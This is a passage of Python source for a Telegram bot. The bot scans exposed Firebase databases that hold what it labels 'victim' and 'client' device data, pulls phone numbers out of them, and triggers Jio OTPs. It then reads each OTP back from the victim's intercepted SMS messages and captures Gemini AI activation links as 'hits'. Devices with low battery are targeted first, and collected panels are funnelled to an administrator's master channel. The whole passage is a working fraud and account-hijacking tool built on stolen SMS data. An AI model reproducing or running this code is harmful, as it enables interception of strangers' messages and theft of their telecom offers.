                                    if any(x in rk_lower for x in ("client", "device", "user", "victim", "all_user")):
                                        if rk_clean not in candidate_paths:
                                            candidate_paths.append(rk_clean)
                        except Exception:
                            pass
                return devices

        for batch_idx in range(start_batch_idx, len(panel_batches) + 1):
            if session.stop_requested:
                logger.info(f"[User {user_id}] Scan stopped by user.")
                break

            batch = panel_batches[batch_idx - 1]
            scan_stats["last_batch_idx"] = batch_idx
            batch_start_num = (batch_idx - 1) * BATCH_SIZE + 1
            batch_end_num = min(batch_idx * BATCH_SIZE, len(panels))
            b_start_time = time.time()

            logger.info(f"[User {user_id}] [Batch {batch_idx}/{len(panel_batches)}] Probing panels {batch_start_num}-{batch_end_num}...")
            await update_progress(
                context,
                session,
                f"Probing Firebase {batch_start_num}-{batch_end_num}..."
            )

            loop = asyncio.get_running_loop()
            futures = [loop.run_in_executor(_SCAN_EXECUTOR, scan_one_panel, u, k) for u, k in batch]
            results_list = await asyncio.gather(*futures, return_exceptions=True)
            batch_devices = {}
            for res in results_list:
                if isinstance(res, dict):
                    batch_devices.update(res)
                elif isinstance(res, Exception):
                    logger.debug(f"scan_one_panel error: {res}")

            if not batch_devices:
                save_scan_state(user_id, {
                    "was_running": not session.stop_requested,
                    "chat_id": chat_id,
                    "active_user": session.user_info,
                    "is_deep": is_deep,
                    "limit": limit,
                    "skip": skip,
                    "last_batch_idx": batch_idx,
                    "total_panels": len(panels),
                    "online_devices": total_online_found,
                    "targets_processed": total_processed_targets,
                    "success": results["success"],
                    "failed": results["failed"],
                    "timestamp": time.time()
                })
                try:
                    del batch_devices
                except (NameError, UnboundLocalError):
                    pass
                force_memory_cleanup()
                await asyncio.sleep(0.01)
                continue

            total_online_found += len(batch_devices)
            scan_stats["online_devices"] = total_online_found
            logger.info(f"[User {user_id}] [Batch {batch_idx}] Discovered {len(batch_devices)} online device(s). Extracting numbers...")

            dev_items = list(batch_devices.items())[:25]

            def _inspect_dev(item):
                did, info = item
                d_data = info.get("data") or {}
                base_p = info.get("base_path", "clients")
                bp = d_data.get("_battery")
                chg = d_data.get("_charging", False)
                is_low = (bp is not None and bp <= 15 and not chg)

                all_nums, jio_nums = extract_device_numbers(d_data)
                if not all_nums:
                    with fb_session() as s_dev:
                        msgs = get_messages(s_dev, info["url"], info["key"], did, 15, d_data, base_p)
                        msg_nums, msg_jio = extract_message_numbers(msgs)
                        all_nums.update(msg_nums)
                        jio_nums.update(msg_jio)
                return did, all_nums, jio_nums, is_low

            inspect_futs = [loop.run_in_executor(_SCAN_EXECUTOR, _inspect_dev, it) for it in dev_items]
            inspect_results = await asyncio.gather(*inspect_futs, return_exceptions=True)

            mappings = defaultdict(set)
            verified_jio = set()
            low_battery_devices = set()

            for res in inspect_results:
                if isinstance(res, Exception):
                    logger.debug(f"Device inspection error: {res}")
                    continue
                did, all_nums, jio_nums, is_low = res
                if is_low:
                    low_battery_devices.add(did)
                verified_jio.update(jio_nums)
                for n in all_nums:
                    mappings[n].add(did)

            raw_targets = []
            skipped_summary = defaultdict(int)
            for num, ds in mappings.items():
                if not ds:
                    continue
                # Global deduplication: Skip if already_active (permanent), success (60d), non-Jio (30d), or no_url (7d)
                is_done, reason, done_info = check_number_processed(user_id, num)
                if is_done:
                    skipped_summary[reason] += 1
                    continue

                did = sorted(ds)[0]
                is_low_bat = did in low_battery_devices
                is_jio = num in verified_jio
                p_level = 0 if is_low_bat else (1 if is_jio else 2)
                raw_targets.append((did, num, p_level, is_low_bat))

            if skipped_summary:
                skip_details = ", ".join([f"{v} {k}" for k, v in skipped_summary.items()])
                logger.info(f"[User {user_id}] [Batch {batch_idx}] Filtered out {sum(skipped_summary.values())} numbers ({skip_details})")

            raw_targets.sort(key=lambda x: x[2])
            targets = [(did, num, is_crit) for did, num, _, is_crit in raw_targets]

            if not targets:
                save_scan_state(user_id, {
                    "was_running": not session.stop_requested,
                    "chat_id": chat_id,
                    "active_user": session.user_info,
                    "is_deep": is_deep,
                    "limit": limit,
                    "skip": skip,
                    "last_batch_idx": batch_idx,
                    "total_batches": len(panel_batches),
                    "total_panels": len(panels),
                    "online_devices": total_online_found,
                    "targets_processed": total_processed_targets,
                    "success": results["success"],
                    "failed": results["failed"],
                    "timestamp": time.time()
                })
                force_memory_cleanup()
                await asyncio.sleep(0.01)
                continue

            scan_stats["total_targets"] = total_processed_targets + len(targets)
            logger.info(f"[User {user_id}] [Batch {batch_idx}] Extracted {len(targets)} target numbers. Processing...")

            active_retries = user_cfg.get("retries", 2)
            active_timeout = user_cfg.get("timeout", 15)

            for (did, mobile, is_critical_bat) in targets:
                if session.stop_requested:
                    break

                if not acquire_in_flight_number(mobile):
                    continue

                total_processed_targets += 1
                scan_stats["current_index"] = total_processed_targets
                scan_stats["current_mobile"] = f"+91 {mobile[-4:]}"

                info = batch_devices.get(did)
                if not info:
                    release_in_flight_number(mobile)
                    continue

                d_bat = info["data"].get("_battery")
                if is_critical_bat:
                    logger.info(f"⚡ 🔋 CRITICAL BATTERY PRIORITY: Device +91 {mobile[-4:]} battery is {d_bat}% (Unplugged)!")

                base_p = info.get("base_path", "clients")
                fb = fb_session()
                jio = jio_session()
                try:
                    latest_msgs = await loop.run_in_executor(_SCAN_EXECUTOR, get_messages, fb, info["url"], info["key"], did, 25, info["data"], base_p)
                    known_ids = set(latest_msgs.keys())

                    otp_verified = False
                    otp_sent = False
                    last_status_code = 0
                    is_jio_num = (mobile in verified_jio)
                    effective_retries = active_retries if is_jio_num else 1

                    for attempt in range(1, effective_retries + 1):
                        if session.stop_requested:
                            break

                        req_start = time.time()
                        retry_tag = f" (Attempt {attempt}/{effective_retries})" if effective_retries > 1 else ""
                        logger.info(f"[User {user_id}] [{total_processed_targets}] Sending Jio OTP for +91 {mobile[-4:]}{retry_tag}")
                        await update_progress(
                            context,
                            session,
                            f"Batch [{batch_idx}/{len(panel_batches)}] OTP for +91 {mobile[-4:]}{retry_tag}..."
                        )

                        otp_sent, last_status_code = await throttled_send_otp(jio, mobile)
                        if not otp_sent:
                            break

                        cur_to = active_timeout if attempt == 1 else 12
                        otp_ok = await wait_otp(fb, info["url"], info["key"], did, known_ids, jio, mobile, req_start, info["data"], base_p, timeout=cur_to, session=session)
                        if otp_ok:
                            otp_verified = True
                            break
                        if attempt < effective_retries and not session.stop_requested:
                            logger.info(f"OTP not received within {cur_to}s for +91 {mobile[-4:]}. Retrying ({attempt + 1}/{effective_retries})...")
                            await asyncio.sleep(1)

                    if session.stop_requested:
                        break

                    if not otp_verified:
                        results["failed"] += 1
                        scan_stats["failed_count"] += 1
                        if not otp_sent:
                            if last_status_code == 400:
                                fail_reason = "not_jio_number"
                            elif last_status_code == 429:
                                fail_reason = "rate_limited"
                            else:
                                fail_reason = "otp_send_failed"
                        else:
                            fail_reason = "otp_failed"
                        save_result(user_id, total_processed_targets, did, mobile, fail_reason, "")
                        await asyncio.sleep(0.02)
                        continue

                    status, url = await loop.run_in_executor(_SCAN_EXECUTOR, get_activation_url, jio)
                    if url:
                        is_fresh = save_result(user_id, total_processed_targets, did, mobile, "success", url)
                        if is_fresh:
                            results["success"] += 1
                            scan_stats["success_count"] += 1
                            logger.info(f"[User {user_id}] 🎯 FRESH SUCCESS: +91 {mobile[-4:]} -> {url}")
                            await broadcast_success(context.bot, mobile, url, session)
                        else:
                            results["failed"] += 1
                            scan_stats["failed_count"] += 1
                            logger.info(f"[User {user_id}] 🔁 Unredeemed Duplicate Ignored: +91 {mobile[-4:]} (Old link already captured, skipped from fresh batch)")
                    else:
                        results["failed"] += 1
                        scan_stats["failed_count"] += 1
                        save_result(user_id, total_processed_targets, did, mobile, status, "")
                        if status == "already_active":
                            logger.info(f"Plan already active on +91 {mobile[-4:]}")
                        elif status == "no_url":
                            logger.info(f"No Gemini AI offer on +91 {mobile[-4:]} (no_url)")
                        else:
                            logger.info(f"Activation check for +91 {mobile[-4:]}: {status}")

                    await asyncio.sleep(0.02)
                finally:
                    release_in_flight_number(mobile)

                    try:
                        fb.close()
                    except Exception:
                        pass
                    try:
                        jio.close()
                    except Exception:
                        pass

            b_duration = time.time() - b_start_time
            scan_stats["batch_times"].append(b_duration)
            if len(scan_stats["batch_times"]) > 20:
                scan_stats["batch_times"].pop(0)

            save_scan_state(user_id, {
                "was_running": not session.stop_requested,
                "chat_id": chat_id,
                "active_user": session.user_info,
                "is_deep": is_deep,
                "limit": limit,
                "skip": skip,
                "last_batch_idx": batch_idx,
                "total_batches": len(panel_batches),
                "total_panels": len(panels),
                "online_devices": total_online_found,
                "targets_processed": total_processed_targets,
                "success": results["success"],
                "failed": results["failed"],
                "timestamp": time.time()
            })
            try:
                del batch_devices
                del dev_items
                del inspect_results
                del targets
            except (NameError, UnboundLocalError):
                pass
            force_memory_cleanup()
            await asyncio.sleep(0.01)

        was_stopped_by_user = session.stop_requested
        if not was_stopped_by_user:
            save_scan_state(user_id, {
                "was_running": False,
                "finished": True,
                "chat_id": chat_id,
                "active_user": session.user_info,
                "is_deep": is_deep,
                "limit": limit,
                "skip": skip,
                "last_batch_idx": len(panel_batches),
                "total_batches": len(panel_batches),
                "total_panels": len(panels),
                "online_devices": total_online_found,
                "targets_processed": total_processed_targets,
                "success": results["success"],
                "failed": results["failed"],
                "timestamp": time.time()
            })
            try:
                if session.progress_msg_id and chat_id:
                    final_pbar = get_progress_bar(100.0)
                    total_batches = scan_stats.get("total_batches", len(panel_batches))
                    _, local_ts = get_current_time()
                    complete_card = (
                        f"✅ <b>2x2 Jio-Gemini Scan Complete!</b>\n\n"
                        f"📊 <b>Loading Progress:</b>\n"
                        f"<code>{final_pbar}</code> ({total_batches}/{total_batches} Batches)\n\n"
                        f"🎯 <b>Total Hits Captured:</b> <b>{results['success']}</b>\n"
                        f"📱 <b>Online Devices:</b> <code>{total_online_found}</code>\n"
                        f"❌ <b>Failed Attempts:</b> <code>{results['failed']}</code>\n\n"
                        f"⏳ <b>Estimated Time:</b> <code>Completed 🏁</code>\n"
                        f"🕒 <i>Finished: {local_ts} (IST)</i>"
                    )
                    complete_markup = InlineKeyboardMarkup([
                        [InlineKeyboardButton("📥 Export Hub", callback_data='menu_export'), InlineKeyboardButton("📊 Results CSV", callback_data='results')],
                        [InlineKeyboardButton("🔙 Main Menu", callback_data='start_menu')]
                    ])
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=session.progress_msg_id,
                        text=complete_card,
                        reply_markup=complete_markup,
                        parse_mode=ParseMode.HTML
                    )
            except Exception as e:
                logger.debug(f"Could not update final progress card: {e}")

        status_heading = "🛑 <b>Scan Stopped by User</b>" if was_stopped_by_user else "✅ <b>2-by-2 Firebase Deep Scan Complete!</b>"
        resume_tip = "\n💡 <i>You can resume scanning anytime using /scan resume</i>" if was_stopped_by_user else ""
        summary = f"""{status_heading}

📊 <b>Results:</b>
• Total Firebase Panels Scanned: {len(panels)}
• Online Devices Discovered: {total_online_found}
• Targets Processed: {total_processed_targets}
• Success Links: <b>{results['success']}</b>
• Failed Attempts: <b>{results['failed']}</b>{resume_tip}

Use /results or /export to download your generated links & CSV."""
        logger.info(f"🏁 Scan finished for user {user_id}: Total={total_processed_targets} | Success={results['success']} | Failed={results['failed']}")
        if was_stopped_by_user:
            finish_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("⏯️ Continue Previous Scan", callback_data='scan_resume')],
                [InlineKeyboardButton("🔄 Run New Scan", callback_data='scan_fresh'), InlineKeyboardButton("🌐 Scan All", callback_data='scan_all')],
                [InlineKeyboardButton("📥 Export Hub", callback_data='menu_export'), InlineKeyboardButton("📊 Results CSV", callback_data='results')],
                [InlineKeyboardButton("🔙 Main Menu", callback_data='start_menu')]
            ])
        else:
            finish_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Run New Scan", callback_data='scan_fresh'), InlineKeyboardButton("🌐 Scan All", callback_data='scan_all')],
                [InlineKeyboardButton("📥 Export Hub", callback_data='menu_export'), InlineKeyboardButton("📊 Results CSV", callback_data='results')],
                [InlineKeyboardButton("🔙 Main Menu", callback_data='start_menu')]
            ])
        if chat_id:
            await safe_telegram_call(context.bot.send_message, chat_id=chat_id, text=summary, reply_markup=finish_markup, parse_mode=ParseMode.HTML)

        master_ch = admin_manager.get_master_log_channel()
        if master_ch and str(master_ch) != str(chat_id):
            u_name = session.user_info.get("username")
            u_tag = f"@{u_name}" if u_name else (session.user_info.get("first_name") or f"User {user_id}")
            m_status = "🛑 Scan Stopped by User" if was_stopped_by_user else "✅ 2x2 Scan Complete"
            master_summary = (
                f"🏁 <b>{m_status} ({html.escape(u_tag)})</b>\n\n"
                f"• Total Targets: <code>{total_processed_targets}</code>\n"
                f"• 🎯 Success Hits: <b>{results['success']}</b> | ❌ Failed: <code>{results['failed']}</code>\n"
                f"• Panels Scanned: <code>{len(panels)}</code>"
            )
            await safe_telegram_call(context.bot.send_message, chat_id=master_ch, text=master_summary, parse_mode=ParseMode.HTML)

        # Isolated file backups strictly for this user
        user_storage = admin_manager.get_effective_storage_channel(user_id)
        user_fresh_file = get_user_fresh_links_file(user_id)
        user_links_file = get_user_links_file(user_id)
        user_results_file = get_user_results_file(user_id)
        backup_uname = session.user_info.get("first_name") or "User"
        fresh_hits = results.get("success", 0)

        # 1. Send Fresh Links Captured In This Specific Scan Run
        if user_fresh_file.exists() and user_fresh_file.stat().st_size > 0:
            if chat_id:
                try:
                    with open(user_fresh_file, "rb") as f:
                        await safe_telegram_call(
                            context.bot.send_document,
                            chat_id=chat_id,
                            document=f,
                            filename="fresh_activation_links.txt",
                            caption=(
                                f"🎯 <b>Fresh Gemini Activation Links ({fresh_hits} New Hits)</b>\n\n"
                                f"• Status: 🟢 100% Fresh & Unused\n"
                                f"• Panels Scanned: <code>{len(panels)}</code>\n"
                                f"• Finished: <code>{local_ts} (IST)</code>\n"
                                f"💡 <i>These are exclusively the fresh links from THIS scan session!</i>"
                            ),
                            parse_mode=ParseMode.HTML
                        )
                except Exception as e:
                    logger.debug(f"Could not send fresh links to chat {chat_id}: {e}")
            if user_storage and str(user_storage) != str(chat_id):
                try:
                    with open(user_fresh_file, "rb") as f:
                        await safe_telegram_call(
                            context.bot.send_document,
                            chat_id=user_storage,
                            document=f,
                            filename="fresh_activation_links.txt",
                            caption=f"🎯 Fresh Gemini Links ({html.escape(backup_uname)} - {fresh_hits} hits)",
                            parse_mode=ParseMode.HTML
                        )
                except Exception as e:
                    logger.debug(f"Could not backup fresh links to storage {user_storage}: {e}")
        elif user_links_file.exists() and user_links_file.stat().st_size > 0 and fresh_hits == 0:
            if chat_id:
                await safe_telegram_call(
                    context.bot.send_message,
                    chat_id=chat_id,
                    text="ℹ️ <i>No new fresh links captured in this specific run. Use /export to download previous links.</i>",
                    parse_mode=ParseMode.HTML
                )

        if user_results_file.exists() and user_results_file.stat().st_size > 0:
            if chat_id:
                try:
                    with open(user_results_file, "rb") as f:
                        await safe_telegram_call(context.bot.send_document, chat_id=chat_id, document=f, filename="gemini_results.csv", caption="📊 Detailed Results CSV")
                except Exception as e:
                    logger.debug(f"Could not send results CSV to chat {chat_id}: {e}")
            if user_storage and str(user_storage) != str(chat_id):
                try:
                    with open(user_results_file, "rb") as f:
                        await safe_telegram_call(context.bot.send_document, chat_id=user_storage, document=f, filename="gemini_results.csv", caption=f"📊 Detailed Results CSV Backup ({html.escape(backup_uname)})")
                except Exception as e:
                    logger.debug(f"Could not backup results CSV to storage {user_storage}: {e}")

        # 3. Synchronize Lifetime Archive & Cloud State Backup to Storage Channel
        try:
            if user_links_file.exists() and user_links_file.stat().st_size > 0 and user_storage and str(user_storage) != str(chat_id):
                with open(user_links_file, "rb") as f:
                    await safe_telegram_call(context.bot.send_document, chat_id=user_storage, document=f, filename="gemini_activation_links.txt", caption=f"🔗 Lifetime Gemini Links Archive ({html.escape(backup_uname)})")
            await backup_workspace_to_storage(context.bot, user_id)
        except Exception as e:
            logger.debug(f"Error updating cloud backup for user {user_id}: {e}")

    except asyncio.CancelledError:
        logger.info(f"[User {user_id}] Scan task was cancelled by user via stop.")
        session.stop_requested = True
        save_scan_state(user_id, {
            "was_running": False,
            "finished": False,
            "chat_id": chat_id,
            "active_user": session.user_info,
            "is_deep": is_deep,
            "limit": limit,
            "skip": skip,
            "last_batch_idx": scan_stats.get("last_batch_idx", 0),
            "total_batches": scan_stats.get("total_batches", 0),
            "total_panels": scan_stats.get("total_panels", 0),
            "online_devices": scan_stats.get("online_devices", 0),
            "targets_processed": scan_stats.get("current_index", 0),
            "success": results["success"],
            "failed": results["failed"],
            "timestamp": time.time()
        })
        try:
            if session.progress_msg_id and chat_id:
                curr_b = scan_stats.get("last_batch_idx", 0)
                tot_b = scan_stats.get("total_batches", 0)
                succ_c = results.get("success", 0)
                fail_c = results.get("failed", 0)
                stop_card = (
                    f"🛑 <b>Scan Stopped by User</b>\n\n"
                    f"📊 <b>Progress Saved:</b>\n"
                    f"• <b>Paused At:</b> Batch <code>{curr_b}</code> of <code>{tot_b}</code>\n"
                    f"🎯 <b>Hits Captured:</b> <b>{succ_c}</b> | ❌ <b>Failed:</b> <code>{fail_c}</code>\n\n"
                    f"👉 <i>Choose an option below to resume or start fresh:</i>"
                )
                stop_markup = InlineKeyboardMarkup([
                    [InlineKeyboardButton("⏯️ Continue Previous Scan", callback_data='scan_resume')],
                    [InlineKeyboardButton("🔄 Run New Scan", callback_data='scan_fresh'), InlineKeyboardButton("🌐 Scan All", callback_data='scan_all')],
                    [InlineKeyboardButton("⚡ Scanner Menu", callback_data='menu_scanner'), InlineKeyboardButton("🔙 Main Menu", callback_data='start_menu')]
                ])
                await safe_telegram_call(
                    context.bot.edit_message_text,
                    chat_id=chat_id,
                    message_id=session.progress_msg_id,
                    text=stop_card,
                    reply_markup=stop_markup,
                    parse_mode=ParseMode.HTML
                )
        except Exception:
            pass
    except Exception as e:
        logger.error(f"Error during scan for user {user_id}: {e}", exc_info=True)
        if chat_id:
            await safe_telegram_call(context.bot.send_message, chat_id=chat_id, text=f"❌ <b>Error:</b> <code>{html.escape(str(e))}</code>", parse_mode=ParseMode.HTML)
    finally:
        active_scans.pop(user_id, None)
        force_memory_cleanup()

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.has_access(user_id):
        if update.callback_query:
            await safe_answer(update, "⛔ Not authorized", show_alert=True)
        else:
            await update.effective_message.reply_text("⛔ <b>Not authorized</b>", parse_mode=ParseMode.HTML)
        return

    session = active_scans.get(user_id)
    if session and session.task and not session.task.done():
        session.stop_requested = True
        saved = load_scan_state(user_id)
        if saved:
            saved["was_running"] = False
            save_scan_state(user_id, saved)
        if update.callback_query:
            await safe_answer(update, "🛑 Stopping scan immediately...", show_alert=False)
        session.task.cancel()
        stop_text = (
            "🛑 <b>Scan Stopped by User</b>\n\n"
            "📊 <i>Your progress has been saved. Choose an action to continue:</i>"
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("⏯️ Continue Previous Scan", callback_data='scan_resume')],
            [InlineKeyboardButton("🔄 Run New Scan", callback_data='scan_fresh'), InlineKeyboardButton("🌐 Scan All", callback_data='scan_all')],
            [InlineKeyboardButton("⚡ Scanner Menu", callback_data='menu_scanner'), InlineKeyboardButton("🔙 Main Menu", callback_data='start_menu')]
        ])
        await send_or_edit(update, stop_text, reply_markup=keyboard)
    else:
        active_scans.pop(user_id, None)
        if update.callback_query:
            await safe_answer(update, "ℹ️ Scanner is not currently running for your account.", show_alert=True)
        else:
            await update.effective_message.reply_text("ℹ️ Scanner is not currently running for your account.", parse_mode=ParseMode.HTML)

# ============ PANEL MANAGEMENT (/panels & Direct Paste) ============
async def panels_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await show_panels_menu(update, context)

_user_paste_accumulators: Dict[int, dict] = {}
_user_paste_tasks: Dict[int, asyncio.Task] = {}

async def _flush_user_paste(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    """
    Waits a short debounce window (1.5s) to aggregate multiple consecutive pasted panel messages.
    Sends a single consolidated response to the user and a single backup to storage channels,
    preventing Telegram Flood Control (RetryAfter) errors.
    """
    try:
        await asyncio.sleep(1.5)
        acc = _user_paste_accumulators.pop(user_id, None)
        if not acc:
            return

        added = acc.get("added", 0)
        duplicates = acc.get("duplicates", 0)
        total = acc.get("total", 0)
        s_added = acc.get("s_added", 0)
        s_dups = acc.get("s_dups", 0)
        s_tot = acc.get("s_tot", 0)
        u_fname = acc.get("first_name", "User")
        message = acc.get("latest_message")

        super_uid = admin_manager.super_admin_id
        master_storage = admin_manager.get_master_storage_channel()
        master_pfile = get_user_panels_file(super_uid)

        # 1. Master Storage backup (if anything new was added)
        if user_id != super_uid and super_uid and master_storage and master_pfile.exists() and s_added > 0:
            try:
                date, tm = get_current_time()
                with open(master_pfile, "rb") as f_backup:
                    msg = await safe_telegram_call(
                        context.bot.send_document,
                        chat_id=master_storage,
                        document=f_backup,
                        filename="panels.txt",
                        caption=(
                            f"👑 <b>Master Storage Auto-Merged (Unique Only)</b>\n"
                            f"• Contributed by: <code>{user_id}</code> ({html.escape(u_fname)})\n"
                            f"• New Unique Added: <code>+{s_added}</code>\n"
                            f"• Duplicates Filtered: <code>{s_dups}</code>\n"
                            f"• Total Master Unique: <code>{s_tot}</code>\n"
                            f"• Date: <code>{date} {tm} (IST)</code>"
                        ),
                        parse_mode=ParseMode.HTML
                    )
                    if msg:
                        await safe_telegram_call(context.bot.pin_chat_message, chat_id=master_storage, message_id=msg.message_id)
            except Exception as e:
                logger.debug(f"Could not forward master panels backup to storage: {e}")

        # 2. User Storage backup (if anything new was added)
        user_storage = admin_manager.get_effective_storage_channel(user_id)
        user_pfile = get_user_panels_file(user_id)
        if user_storage and user_pfile.exists() and added > 0:
            try:
                date, tm = get_current_time()
                with open(user_pfile, "rb") as f_backup:
                    msg = await safe_telegram_call(
                        context.bot.send_document,
                        chat_id=user_storage,
                        document=f_backup,
                        filename="panels.txt",
                        caption=(
                            f"📦 <b>Panels Auto-Merged (Unique Only)</b>\n"
                            f"• User: <code>{user_id}</code> ({html.escape(u_fname)})\n"
                            f"• New Added: <code>+{added}</code>\n"
                            f"• Duplicates Filtered: <code>{duplicates}</code>\n"
                            f"• Total Active Unique: <code>{total}</code>\n"
                            f"• Date: <code>{date} {tm} (IST)</code>"
                        ),
                        parse_mode=ParseMode.HTML
                    )
                    if msg:
                        await safe_telegram_call(context.bot.pin_chat_message, chat_id=user_storage, message_id=msg.message_id)
            except Exception as e:
                logger.debug(f"Could not forward panels backup to storage: {e}")

        # 3. Consolidated user reply
        if message:
            storage_tip = ""
            if not admin_manager.is_super_admin(user_id) and not admin_manager.has_storage_channel(user_id):
                storage_tip = "\n\n⚠️ <b>Next step:</b> Link your storage channel using <code>/setstorage &lt;channel_id&gt;</code> before scanning!"

            if added > 0:
                reply_txt = (
                    f"✅ <b>Panels Successfully Merged! (Unique Only)</b>\n\n"
                    f"• <b>New Unique Added:</b> <code>+{added}</code>\n"
                    f"• <b>Duplicates Filtered:</b> <code>{duplicates}</code>\n"
                    f"• <b>Total Active Panels:</b> <code>{total}</code>"
                    f"{storage_tip}\n\n"
                    f"Ready to scan! Use /scan to begin."
                )
            else:
                reply_txt = (
                    f"ℹ️ <b>No New Panels Added!</b>\n\n"
                    f"All <code>{duplicates}</code> Firebase link(s) provided are already present in your active panels list. No duplicate links were added.\n\n"
                    f"• <b>Total Active Panels:</b> <code>{total}</code>\n"
                    f"• <b>Duplicates Filtered:</b> <code>{duplicates}</code>"
                    f"{storage_tip}"
                )

            await safe_telegram_call(message.reply_text, reply_txt, parse_mode=ParseMode.HTML)
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.debug(f"Error in _flush_user_paste: {e}")
    finally:
        if _user_paste_tasks.get(user_id) is asyncio.current_task():
            _user_paste_tasks.pop(user_id, None)

async def handle_direct_paste_panels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.effective_message
    if not message:
        return

    text = ""
    if message.text:
        text = message.text
    elif message.caption:
        text = message.caption

    doc = message.document
    if doc and doc.file_name and doc.file_name.lower().endswith(".txt"):
        try:
            f = await context.bot.get_file(doc.file_id)
            buf = io.BytesIO()
            await f.download_to_memory(buf)
            buf.seek(0)
            text = buf.read().decode("utf-8", errors="ignore")
        except Exception as e:
            logger.debug(f"Could not read attached text doc: {e}")

    if not text:
        return

    text_lower = text.lower()
    if "firebaseio.com" not in text_lower and "firebasedatabase.app" not in text_lower:
        return

    user = update.effective_user
    chat = update.effective_chat
    chat_id = str(chat.id) if chat else ""

    # Identify user: direct user interaction or channel/group storage owner
    user_id = user.id if user else 0
    if not user_id or not admin_manager.has_access(user_id):
        ch_owner = admin_manager.get_user_by_storage_channel(chat_id)
        if ch_owner:
            user_id = ch_owner

    if not user_id or not admin_manager.has_access(user_id):
        if chat and chat.type == "private":
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("💬 Contact Support to Get Access", url="https://t.me/OwAtom")],
                [InlineKeyboardButton("🆔 Copy My ID", callback_data='btn_my_id')]
            ])
            await safe_telegram_call(
                message.reply_text,
                f"⛔ <b>Access Denied / Not Authorized</b>\n\n"
                f"🆔 <b>Your User ID:</b> <code>{user_id}</code>\n\n"
                f"Free Mode is currently OFF. Send your User ID to <b>@OwAtom</b> to get access.",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
        return

    new_entries = extract_panels_from_text(text)
    if not new_entries:
        return

    added, duplicates, total = append_panels(new_entries, user_id=user_id)
    logger.info(f"User {user_id} processed {len(new_entries)} panels. Added: {added}, Duplicates: {duplicates}, Total: {total}")

    # Also auto-merge into Super Admin Master Storage (Unique Only)
    super_uid = admin_manager.super_admin_id
    s_added, s_dups, s_tot = 0, 0, 0
    if user_id != super_uid and super_uid:
        s_added, s_dups, s_tot = append_panels(new_entries, user_id=super_uid)
        logger.info(f"Master storage auto-merge from user {user_id}: Added +{s_added}, Duplicates: {s_dups}, Total: {s_tot}")

    # Debounce rapid pastes across multiple consecutive messages
    acc = _user_paste_accumulators.get(user_id)
    if not acc:
        acc = {
            "user_id": user_id,
            "first_name": (user.first_name or "User") if user else f"User {user_id}",
            "chat_id": chat_id,
            "latest_message": message,
            "added": 0,
            "duplicates": 0,
            "total": total,
            "s_added": 0,
            "s_dups": 0,
            "s_tot": s_tot
        }
        _user_paste_accumulators[user_id] = acc

    acc["added"] += added
    acc["duplicates"] += duplicates
    acc["total"] = total
    acc["s_added"] += s_added
    acc["s_dups"] += s_dups
    acc["s_tot"] = s_tot
    acc["latest_message"] = message

    existing_task = _user_paste_tasks.get(user_id)
    if existing_task and not existing_task.done():
        existing_task.cancel()
    _user_paste_tasks[user_id] = asyncio.create_task(_flush_user_paste(user_id, context))

# ============ UPLOAD CONVERSATION HANDLER ============
async def upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.has_access(user_id):
        if update.callback_query:
            await safe_answer(update, "⛔ Not authorized", show_alert=True)
        else:
            await update.effective_message.reply_text("⛔ <b>Not authorized</b>", parse_mode=ParseMode.HTML)
        return ConversationHandler.END

    if update.callback_query:
        await safe_answer(update)

    text = "📤 <b>Upload Panels File</b>\n\nPlease send your <code>panels.txt</code> document now (or click Cancel below to abort):"
    markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Upload", callback_data='cancel')]])
    await send_or_edit(update, text, reply_markup=markup)
    return 1

async def upload_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id if user else 0
    if not admin_manager.has_access(user_id):
        if update.effective_message:
            await update.effective_message.reply_text("⛔ <b>Not authorized</b>", parse_mode=ParseMode.HTML)
        return ConversationHandler.END

    message = update.effective_message
    doc = message.document if message else None
    if not doc or not doc.file_name or not doc.file_name.lower().endswith(".txt"):
        await message.reply_text("❌ Please send a valid <code>.txt</code> file (e.g. panels.txt), or /cancel.", parse_mode=ParseMode.HTML)
        return 1

    temp_path = BASE_DIR / f"temp_upload_{user_id}_{int(time.time())}.txt"
    try:
        file = await context.bot.get_file(doc.file_id)
        await file.download_to_drive(temp_path)

        with open(temp_path, "r", encoding="utf-8", errors="ignore") as f:
            file_content = f.read()

        new_entries = extract_panels_from_text(file_content)
        if not new_entries:
            await message.reply_text("❌ No valid Firebase URLs found in the uploaded file.", parse_mode=ParseMode.HTML)
            return ConversationHandler.END

        added, duplicates, total = append_panels(new_entries, user_id=user_id)
        logger.info(f"User {user_id} uploaded panels file. Added: {added}, Duplicates: {duplicates}, Total: {total}")

        # Also auto-merge into Super Admin Master Storage (Unique Only)
        super_uid = admin_manager.super_admin_id
        if user_id != super_uid and super_uid:
            s_added, s_dups, s_tot = append_panels(new_entries, user_id=super_uid)
            logger.info(f"Master storage auto-merge from upload by user {user_id}: Added +{s_added}, Duplicates: {s_dups}, Total: {s_tot}")
            master_storage = admin_manager.get_master_storage_channel()
            master_pfile = get_user_panels_file(super_uid)
            if master_storage and master_pfile.exists() and s_added > 0:
                try:
                    date, tm = get_current_time()
                    u_fname = (user.first_name or "User") if user else f"User {user_id}"
                    with open(master_pfile, "rb") as f_backup:
                        msg = await safe_telegram_call(
                            context.bot.send_document,
                            chat_id=master_storage,
                            document=f_backup,
                            filename="panels.txt",
                            caption=(
                                f"👑 <b>Master Storage Auto-Merged (Unique Only)</b>\n"
                                f"• Contributed by: <code>{user_id}</code> ({html.escape(u_fname)})\n"
                                f"• New Unique Added: <code>+{s_added}</code>\n"
                                f"• Duplicates Filtered: <code>{s_dups}</code>\n"
                                f"• Total Master Unique: <code>{s_tot}</code>\n"
                                f"• Date: <code>{date} {tm} (IST)</code>"
                            ),
